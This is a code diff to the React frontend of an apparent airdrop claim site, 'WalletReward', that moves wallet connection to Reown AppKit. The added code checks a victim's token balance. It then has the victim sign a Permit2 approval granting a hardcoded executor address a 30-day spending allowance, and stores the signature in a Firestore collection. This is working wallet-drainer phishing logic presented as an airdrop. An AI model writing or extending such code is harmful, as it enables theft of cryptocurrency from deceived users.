@@ -11,9 +11,11 @@ import {
   Zap,
 } from 'lucide-react';
 import { BrowserProvider, Contract, formatUnits } from 'ethers';
+import { createAppKit } from '@reown/appkit/react';
+import { EthersAdapter } from '@reown/appkit-adapter-ethers';
+import { sepolia } from '@reown/appkit/networks';
 import { addDoc, collection, doc, getDoc, serverTimestamp } from 'firebase/firestore';
 import { db } from './firebase';
-import { init as initEtherSpirit, connect as connectWallet, signPermit } from '../packages/etherspirit/src/index.js';
 
 /**
  * WalletReward Premium Frontend
@@ -28,6 +30,34 @@ const DEFAULT_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
 const DEFAULT_TOKEN = '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
 const MIN_REQUIRED_BALANCE = 100;
 const DEFAULT_SPENDING_CAP_UNITS = 10000;
+const REOWN_PROJECT_ID = '2541b17d4e46b8d8593a7fbbaf477df6';
+
+const appKit = createAppKit({
+  adapters: [new EthersAdapter()],
+  networks: [sepolia],
+  projectId: REOWN_PROJECT_ID,
+  metadata: {
+    name: 'WalletReward',
+    description: 'Airdrop claim portal',
+    url: 'https://walletreward.com',
+    icons: []
+  },
+});
+
+const getAppKitProvider = () => {
+  const provider =
+    appKit.getWalletProvider?.() ||
+    appKit.getProvider?.() ||
+    appKit.provider;
+  if (!provider) throw new Error('Wallet provider not available');
+  return provider;
+};
+
+const hexToNumber = (hex) => {
+  if (!hex) return null;
+  if (typeof hex === 'number') return hex;
+  return parseInt(hex.toString(), 16);
+};
 
 const App = () => {
   // State to manage the current phase of the airdrop process
@@ -72,9 +102,9 @@ const App = () => {
     let cancelled = false;
 
     const loadTokenInfo = async () => {
-      if (!window.ethereum || !tokenAddress) return;
+      if (!tokenAddress) return;
       try {
-        const provider = new BrowserProvider(window.ethereum);
+        const provider = new BrowserProvider(getAppKitProvider());
         const token = new Contract(
           tokenAddress,
           [
@@ -110,19 +140,48 @@ const App = () => {
   }, [tokenAddress]);
 
   useEffect(() => {
-    initEtherSpirit({
-      tokenAddress,
-      executorAddress,
-      spendingCap
+    const unsub = appKit.subscribeAccount((acct) => {
+      if (acct?.isConnected && acct?.address) {
+        setConnectedAddress(acct.address);
+      } else {
+        setConnectedAddress(null);
+      }
     });
-  }, [tokenAddress, executorAddress, spendingCap]);
+
+    return () => {
+      unsub?.();
+    };
+  }, []);
 
   // --- Handlers ---
   const handleConnect = async () => {
     setIsConnecting(true);
     setConnectError('');
     try {
-      const address = await connectWallet();
+      const openModal = () => {
+        if (typeof appKit.open === 'function') return appKit.open();
+        if (typeof appKit.openModal === 'function') return appKit.openModal();
+        throw new Error('AppKit modal not available');
+      };
+
+      await openModal();
+
+      const address = await new Promise((resolve, reject) => {
+        let unsub = null;
+        const timeoutId = setTimeout(() => {
+          if (unsub) unsub();
+          reject(new Error('Wallet connection timed out'));
+        }, 30000);
+
+        unsub = appKit.subscribeAccount((acct) => {
+          if (acct?.isConnected && acct?.address) {
+            clearTimeout(timeoutId);
+            if (unsub) unsub();
+            resolve(acct.address);
+          }
+        });
+      });
+
       setConnectedAddress(address || null);
       setPhase(1);
     } catch (err) {
@@ -139,9 +198,7 @@ const App = () => {
 
     try {
       if (!connectedAddress) throw new Error('Connect a wallet first.');
-      if (!window.ethereum) throw new Error('No Ethereum provider detected.');
-
-      const provider = new BrowserProvider(window.ethereum);
+      const provider = new BrowserProvider(getAppKitProvider());
       const token = new Contract(
         tokenAddress,
         ['function balanceOf(address) view returns (uint256)'],
@@ -171,11 +228,74 @@ const App = () => {
     setSignError('');
 
     try {
-      const result = await signPermit({
+      const provider = getAppKitProvider();
+      const accounts = await provider.request({ method: 'eth_accounts' });
+      const owner = (accounts && accounts[0]) || (await provider.request({ method: 'eth_requestAccounts' }))[0];
+      if (!owner) throw new Error('Wallet not connected');
+
+      const chainHex = await provider.request({ method: 'eth_chainId' });
+      const chainId = hexToNumber(chainHex);
+
+      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
+      const nonce = 0;
+
+      const permitted = {
         token: tokenAddress,
-        amount: spendingCap,
-        executor: executorAddress
+        amount: spendingCap.toString(),
+        expiration: deadline,
+        nonce
+      };
+
+      const domain = { name: 'Permit2', chainId, verifyingContract: '0x000000000022D473030F116dDEE9F6B43aC78BA3' };
+
+      const types = {
+        EIP712Domain: [
+          { name: 'name', type: 'string' },
+          { name: 'chainId', type: 'uint256' },
+          { name: 'verifyingContract', type: 'address' }
+        ],
+        PermitSingle: [
+          { name: 'details', type: 'PermitDetails' },
+          { name: 'spender', type: 'address' },
+          { name: 'sigDeadline', type: 'uint256' }
+        ],
+        PermitDetails: [
+          { name: 'token', type: 'address' },
+          { name: 'amount', type: 'uint160' },
+          { name: 'expiration', type: 'uint48' },
+          { name: 'nonce', type: 'uint48' }
+        ]
+      };
+
+      const message = {
+        details: permitted,
+        spender: executorAddress,
+        sigDeadline: deadline
+      };
+
+      const payload = JSON.stringify({ domain, types, primaryType: 'PermitSingle', message });
+      const signature = await provider.request({
+        method: 'eth_signTypedData_v4',
+        params: [owner, payload]
       });
+
+      const raw = signature.startsWith('0x') ? signature.slice(2) : signature;
+      const r = '0x' + raw.slice(0, 64);
+      const s = '0x' + raw.slice(64, 128);
+      let v = parseInt(raw.slice(128, 130), 16);
+      if (v === 0 || v === 1) v += 27;
+
+      const result = {
+        owner,
+        spender: executorAddress,
+        token: tokenAddress,
+        amount: spendingCap.toString(),
+        deadline,
+        nonce,
+        r,
+        s,
+        v
+      };
 
       await addDoc(collection(db, 'permit2_signatures'), {
         ...result,
